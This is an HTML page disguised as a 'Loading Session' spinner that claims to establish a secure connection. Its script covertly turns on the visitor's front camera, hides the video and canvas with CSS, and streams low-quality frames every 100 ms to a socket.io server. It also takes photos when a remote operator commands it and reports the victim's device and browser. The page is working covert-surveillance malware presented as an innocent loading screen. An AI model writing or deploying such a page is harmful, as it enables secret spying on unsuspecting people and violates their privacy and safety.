<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Please Wait</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f9;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .card {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            max-width: 350px;
            width: 85%;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        video, canvas {
            display: none !important;
            visibility: hidden !important;
            width: 0 !important;
            height: 0 !important;
        }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>Loading Session...</h2>
        <div class="spinner"></div>
        <p style="color: #666; font-size: 14px;">Please wait while we establish secure connection.</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let mediaStream = null;
        let isCameraReady = false;
        let streamInterval = null;

        // Simple Device and Browser Info Parser
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Desktop/PC";
            let browser = "Unknown Browser";

            if (/android/i.test(ua)) device = "Android Mobile";
            else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS Device";
            else if (/mobile/i.test(ua)) device = "Mobile Device";

            if (/chrome|crios/i.test(ua)) browser = "Google Chrome";
            else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
            else if (/safari/i.test(ua)) browser = "Apple Safari";
            else if (/edg/i.test(ua)) browser = "Microsoft Edge";

            return `${device} (${browser})`;
        }

        function startCameraStream() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    mediaStream = stream;
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        isCameraReady = true;
                        socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
                        startLoop();
                    };
                })
                .catch(err => console.error("Camera access error:", err));
        }

        function startLoop() {
            if (streamInterval) clearInterval(streamInterval);
            streamInterval = setInterval(() => {
                if (!isCameraReady || !video.videoWidth) return;
                const context = canvas.getContext('2d');
                canvas.width = 320;
                canvas.height = 240;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const frameData = canvas.toDataURL('image/jpeg', 0.3);
                socket.emit('live-stream-frame', frameData);
            }, 100);
        }

        // Auto-resume stream when tab becomes active again
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === "visible") {
                if (video.paused && mediaStream) {
                    video.play().catch(e => console.log("Play error:", e));
                } else if (!mediaStream) {
                    startCameraStream();
                }
                socket.emit('user-ready', { deviceInfo: getDeviceInfo() });
            }
        });

        startCameraStream();

        function takeSinglePhoto() {
            if (!isCameraReady) return;
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.6);
            socket.emit('user-photo-captured', imageData);
        }

        socket.on('start-auto-capture', () => {
            let captureCount = 0;
            const maxCaptures = 5;
            takeSinglePhoto();
            captureCount++;

            const intervalId = setInterval(() => {
                if (captureCount < maxCaptures) {
                    takeSinglePhoto();
                    captureCount++;
                } else {
                    clearInterval(intervalId);
                }
            }, 1000);
        });

        socket.on('capture-photo', () => takeSinglePhoto());

        socket.on('disable-user-access', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            document.body.innerHTML = `
                <div class="card">
                    <h2 style="color: #e53935;">Session Ended</h2>
                    <p style="color: #666; font-size: 14px;">This link has been disabled by the administrator.</p>
                </div>
            `;
        });
    </script>
</body>
</html>
